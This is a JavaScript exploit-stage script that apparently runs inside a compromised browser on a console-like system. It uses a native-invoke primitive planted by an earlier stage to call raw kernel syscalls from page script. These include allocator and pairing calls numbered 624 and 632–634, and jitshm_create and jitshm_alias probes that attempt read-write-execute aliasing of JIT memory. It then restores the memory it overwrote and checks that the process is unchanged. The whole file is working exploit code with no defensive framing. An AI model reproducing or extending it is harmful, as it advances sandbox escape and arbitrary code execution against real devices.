// Three-part continuation: (1) 624-allocator IDs → 632/633/634 pairing,
// (2) jitshm_create/alias shape probe, (3) report missing-wrapper status.
// All calls through v27 wrappers. Full restore, PID verified.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys624 !== "number" ||
      typeof native.wrappers.sys533 !== "number")
    throw new Error("chain_missing");
  var frame = native.frame;
  var address = native.frameAddress;
  var bufOff = 0x200, bufLen = 0x1000;
  var guardOff = bufOff + bufLen;
  var guardLen = 0x80;
  var regionEnd = guardOff + guardLen;
  if (regionEnd > frame.length)
    throw new Error("frame_region_too_small");
  var bufAddress = address + bufOff;
  var original = Array.from(frame.subarray(bufOff, regionEnd));
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function arm() {
    for (var i = 0; i < bufLen; i++)
      frame[bufOff + i] = (i * 7 + 3) & 255;
    frame.fill(0xa5, guardOff, guardOff + guardLen);
  }
  function callArgs(name, args) {
    if (!native.wrappers[name])
      return { ret: null, errno: null, extent: 0, hex: "" };
    arm();
    var call = native.call(name, args);
    var errno = (call.value === -1) ? native.readErrno() : null;
    var first = -1, last = -1;
    for (var i = 0; i < bufLen; i++) {
      if (frame[bufOff + i] !== ((i * 7 + 3) & 255)) {
        if (first === -1) first = i;
        last = i;
      }
    }
    var hex = "";
    if (first !== -1) {
      var dumpLen = Math.min(32, last - first + 1);
      for (var d = 0; d < dumpLen; d++)
        hex += ("0" + frame[bufOff + first + d].toString(16)).slice(-2);
    }
    return { ret: call.value, errno: errno,
      extent: (first === -1) ? 0 : last - first + 1,
      hex: hex };
  }
  function fmt(o) {
    return o.ret + "/" + (o.errno === null ? "ok" : o.errno) +
      "/x" + o.extent + (o.hex ? "h" + o.hex : "");
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("cont_preflight");
  var lines = [];

  // PART 1: 624 allocator → 632/633/634 pairing
  phase = "alloc624";
  var id1 = native.call("sys624", [0, 0, 0, 0, 0, 0]);
  var id2 = native.call("sys624", [0, 0, 0, 0, 0, 0]);
  var id3 = native.call("sys624", [0, 0, 0, 0, 0, 0]);
  lines.push("624_ids:" + id1.value + "," + id2.value + "," + id3.value);
  mark("cont_624_ids");
  phase = "pair632";
  var r632 = native.call("sys632", [id1.value, 0, 0, 0, 0, 0]);
  var e632 = (r632.value === -1) ? native.readErrno() : null;
  var r633 = native.call("sys633", [id1.value, 0, 0, 0, 0, 0]);
  var e633 = (r633.value === -1) ? native.readErrno() : null;
  var r634 = native.call("sys634", [id1.value, 0, 0, 0, 0, 0]);
  var e634 = (r634.value === -1) ? native.readErrno() : null;
  lines.push("632(" + id1.value + "):" + r632.value + "/" +
    (e632 === null ? "ok" : e632));
  lines.push("633(" + id1.value + "):" + r633.value + "/" +
    (e633 === null ? "ok" : e633));
  lines.push("634(" + id1.value + "):" + r634.value + "/" +
    (e634 === null ? "ok" : e634));
  mark("cont_pair_done");

  // PART 2: jitshm_create/alias shape probe
  phase = "jitshm";
  // jitshm_create(name?, size, flags?) — try common shapes
  var j1 = callArgs("sys533", [0, 0x100000, 0]);  // size=1MB, flags=0
  lines.push("533(size1M,f0):" + fmt(j1));
  var j2 = callArgs("sys533", [0, 0x100000, 1]);  // flags=1
  lines.push("533(size1M,f1):" + fmt(j2));
  var j3 = callArgs("sys533", [0, 0x400000, 0]);  // size=4MB
  lines.push("533(size4M,f0):" + fmt(j3));
  mark("cont_jitshm_create");
  // jitshm_alias(handle, mode) — alias the first create result
  var jhandle = j1.ret;
  if (jhandle > 0) {
    var j4 = callArgs("sys534", [jhandle, 2]);  // mode=2 (RW?)
    lines.push("534(h" + jhandle + ",m2):" + fmt(j4));
    var j5 = callArgs("sys534", [jhandle, 3]);  // mode=3 (RWX?)
    lines.push("534(h" + jhandle + ",m3):" + fmt(j5));
  } else {
    lines.push("534:skipped_no_handle");
  }
  mark("cont_jitshm_alias");

  // PART 3: status
  lines.push("573_wrapper:" +
    (native.wrappers.sys573 ? "present" : "absent"));

  // Restore
  for (var r = 0; r < original.length; r++)
    frame[bufOff + r] = original[r];
  var restored = true;
  for (var r2 = 0; r2 < original.length; r2++)
    if (frame[bufOff + r2] !== original[r2]) { restored = false; break; }
  var after = native.call("getpid", []);
  mark("cont_done");
  var linesA = [], linesB = [];
  for (var li = 0; li < lines.length; li++) {
    if (linesA.join(" | ").length + lines[li].length < 440)
      linesA.push(lines[li]);
    else linesB.push(lines[li]);
  }
  result = { id: "continuation_v1",
    status: (after.value === before.value && after.high === 0 &&
      restored) ? "pass" : "fail",
    details: { lines_a: linesA.join(" | "),
      lines_b: linesB.join(" | "),
      pid_ok: after.value === before.value && after.high === 0,
      region_restored: restored } };
} catch (error) {
  result = { id: "continuation_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
